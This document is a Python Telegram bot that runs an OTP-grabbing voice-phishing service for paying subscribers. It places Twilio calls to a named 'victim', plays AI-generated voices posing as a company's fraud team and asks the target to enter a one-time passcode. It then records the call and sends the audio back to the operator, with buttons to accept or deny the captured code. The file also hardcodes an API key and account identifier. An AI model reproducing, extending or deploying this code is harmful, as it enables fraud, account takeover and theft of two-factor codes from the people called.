import telebot,json, os
from flask import Flask, request
from twilio.rest import Client
from telebot import types
import requests
from requests.auth import HTTPBasicAuth
from datetime import datetime
import random, string
import ast
from datetime import date
from datetime import timedelta  
from datetime import datetime 

raw_config = json.loads(open('conf/settings.txt', 'r').read())

bot_token = raw_config['bot_token']
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
ngrok = raw_config['ngrok_url']
phone_numz = raw_config['Twilio Phone Number']

client = Client(account_sid, auth_token)
bot = telebot.TeleBot(bot_token)  

def check_subscription(idkey):
    subscription = open('conf/'+idkey+'/subs.txt', 'r').read()
    idmember = subscription
    idmember = datetime.strptime(idmember, '%d/%m/%Y')
    if idmember < datetime.now():
        return "EXPIRED"
    else:
        return "ACTIVE"

def generate_ai(iduser,text,page):
    headers = {
    'accept': 'audio/mpeg',
    'xi-api-key': '20290d6955f246c8c4472008cd9de1c5',
    'Content-Type': 'application/json',
    }

    json_data = {
    'text': text,
    'voice_settings': {
        'stability': 1,
        'similarity_boost': 1,
    },
    }
    botai = requests.post('https://api.elevenlabs.io/v1/text-to-speech/21m00Tcm4TlvDq8ikWAM', headers=headers, json=json_data)
    open(f'C:/xampp/htdocs/conf/{iduser}/{page}.mp3',   'wb').write(botai.content)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    bot.send_message(call.message.chat.id, text='Call Status : Queued')
    iduser = call.from_user.id
    bot.send_message(call.message.chat.id, text='Generating AI Voices, please wait')
    generate_ai(str(iduser), f"Hello!, this is Kristina from {open('conf/'+str(iduser)+'/Company Name.txt', 'r').read()}. To ensure that I am speaking to {open('conf/'+str(iduser)+'/Name.txt', 'r').read()}, I would kindly ask you to press 1 on your phone's keypad.","checkifhuman")
    generate_ai(str(iduser), f"Thank you.. for confirming your identity, {open('conf/'+str(iduser)+'/Name.txt', 'r').read()}. I am contacting you today because we have noticed some unusual activity on your account that we would like to bring to your attention. In order to verify that this is indeed you and not someone else attempting to access your account, we would like to conduct a verification session. This session will involve answering a few questions related to your account, and may also include providing us with a code that we will provide to you.","explain")
    generate_ai(str(iduser), f"We have sent a {open('conf/'+str(iduser)+'/Digits.txt', 'r').read()}-digit code to the phone number linked to your account.. This code is a one-time password that you can use to verify your identity and access your account. Please check your phone and provide us with the code so we can proceed with the verification process. Please note that this code is only valid for a short period of time, so please ensure that you provide us with the code as soon as possible", "askdigits")
    bot.send_message(call.message.chat.id, text='Generated AI Voices, please continue')
    pisahin = call.data.split("|")
    if pisahin[0] == "callv":
        caller = client.calls.create(
            machine_detection='DetectMessageEnd',
            record=True,
            url=f'{ngrok}/voice?chat_id={call.message.chat.id}&user_id={iduser}',
            to=f'{pisahin[2]}',
            from_=f'{phone_numz}'
            )
        sid = caller.sid
        print(sid)
        a = 0
        b = 0
        c = 0
        d = 0
        e = 0        
        while True:
            if client.calls(sid).fetch().status == 'ringing':
                if not a >= 1:
                    bot.send_message(call.message.chat.id, text='Call Status : Ringing')
                    a = a + 1
            elif client.calls(sid).fetch().status == 'machine_end_beep':
                if not b >= 1:
                    bot.send_message(call.message.chat.id, text='Call Status : Voice Mail')
                    break
                    b = b + 1 
            elif client.calls(sid).fetch().status == 'in-progress':    
                if not c >= 1:
                    bot.send_message(call.message.chat.id, text='Call Status : In Progress')
                    c = c + 1 
            elif client.calls(sid).fetch().status == 'completed':
                url = f"https://api.twilio.com/2010-04-01/Accounts/AC88463b64bd6c09ec64af4440fa6b5f5a/Recordings/{sid}"
                r = requests.get(url,auth = HTTPBasicAuth(account_sid, auth_token))
                open(f'conf/{iduser}/record.mp3',   'wb').write(r.content)
                bot.send_message(call.message.chat.id, text='Call Status : Completed')
                file_data = open(f'conf/{iduser}/record.mp3', 'rb')
                bot.send_audio(call.message.chat.id, file_data)
                break
            elif client.calls(sid).fetch().status == 'failed':
                bot.send_message(call.message.chat.id, text='Call Status : Failed')
                break
            elif client.calls(sid).fetch().status == 'no-answer':
                bot.send_message(call.message.chat.id, text='Call Status : No Answer')
                break
            elif client.calls(sid).fetch().status == 'canceled':
                bot.send_message(call.message.chat.id, text='Call Status : Canceled')
                break
            elif client.calls(sid).fetch().status == 'busy':
                bot.send_message(call.message.chat.id, text='Call Status : Busy')
                break                        
            else:
                print(client.calls(sid).fetch().status)
                #bot.edit_message_text(call.message.chat.id, text='Call Status : Complete')


    elif call.data == "hangupv":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(status='completed')

    elif call.data == "denyotp":
        calls = client.calls.list(limit=1)
        for record in calls:    
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/denyotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')

    elif call.data == "acceptotp":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/acceptotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')  

    elif call.data == "clearset":
        open("conf/"+str(iduser)+"/phonenum.txt", "w").close()
        open("conf/"+str(iduser)+"/Name.txt", "w").close()
        open("conf/"+str(iduser)+"/Digits.txt", "w").close()
        open("conf/"+str(iduser)+"/Company Name.txt", "w").close()
        bot.send_message(call.message.chat.id, text='Success Clearing')

@bot.message_handler(commands=['call'])

def custom_call_handler(pm):
    try:
        iduser = pm.from_user.id
        if check_subscription(str(iduser)) == "ACTIVE":
            putusin = pm.text
            putusin = putusin.split(" ")
            digits = putusin[3]
            name = putusin[2]
            companyz = putusin[4]
            phonenum = putusin[1]
            open(f'conf/{iduser}/Digits.txt', 'w').write(f'{digits}')
            open(f'conf/{iduser}/Name.txt', 'w').write(f'{name}')
            open(f'conf/{iduser}/Company Name.txt', 'w').write(f'{companyz}')
            caller_data = bot.send_message(pm.chat.id, f"Victim Name Is {name}\nPhone is {phonenum}\nGetting {digits} codes from {companyz}")
            buttons = telebot.types.InlineKeyboardMarkup(row_width=3)
            btn_1 = telebot.types.InlineKeyboardButton('Call',callback_data=f'callv|{name}|{phonenum}|{digits}|{companyz}')
            btn_2 = telebot.types.InlineKeyboardButton('Hangup',callback_data='hangupv')
            btn_5 = telebot.types.InlineKeyboardButton('Deny OTP',callback_data='denyotp')
            btn_4 = telebot.types.InlineKeyboardButton('Accept OTP',callback_data='acceptotp')
            btn_3 = telebot.types.InlineKeyboardButton('Clear Settings',callback_data='clearset')
            buttons.add(btn_1,btn_2,btn_3,btn_4,btn_5)
            msg_buttons = bot.send_message(pm.chat.id, text=f'What you want to do?', reply_markup=buttons) 
        else:
            sent_msg = bot.send_message(pm.chat.id, f"Hello!\nYour Subscription is currently not active, contact admin")  
    except:
        bot.send_message(pm.chat.id, f"It seems that you put a wrong command, please check")

@bot.message_handler(commands=['cek'])
def check_bisa(pm):
    iduser = pm.from_user.id
    if check_subscription(str(iduser)) == "ACTIVE":
        bot.send_message(pm.chat.id, f"Hello!\nYour Subscription is currently active\n\n{iduser}")
    else:
        bot.send_message(pm.chat.id, f"Hello!\nYour Subscription is currently not active, contact admin\n\n{iduser}")    

@bot.message_handler(commands=['start'])
def start_sz(pm):
    today = date.today()
    iduser = pm.from_user.id
    path = "conf/"+str(iduser)
    isExist = os.path.exists(path)
    bot.send_message(pm.chat.id, f"Welcome!\nCheck Access Using : /cek\nCheck Module with : /module")
    if not isExist:
        os.makedirs(path)
        open(f'conf/{iduser}/subs.txt', 'w').write(f'{today.strftime("%d/%m/%Y")}')

@bot.message_handler(commands=['add_subs'])
def add_subs(pm):
    putusin = pm.text
    putusinz = putusin.split(" ")
    idmember = putusinz[1]
    brp = putusinz[2]
    ayam = (datetime.now() + timedelta(days=int(brp)))
    aduwe = ayam.strftime("%d/%m/%Y")
    try:
        open(f'conf/{idmember}/subs.txt', 'w').write(f'{ayam.strftime("%d/%m/%Y")}')
        bot.send_message(pm.chat.id, f"Success!\n Added Subscription For {idmember}, expired at {aduwe}")  
    except:
        bot.send_message(pm.chat.id, f"Failed!\n {idmember} is not registered")  


bot.polling()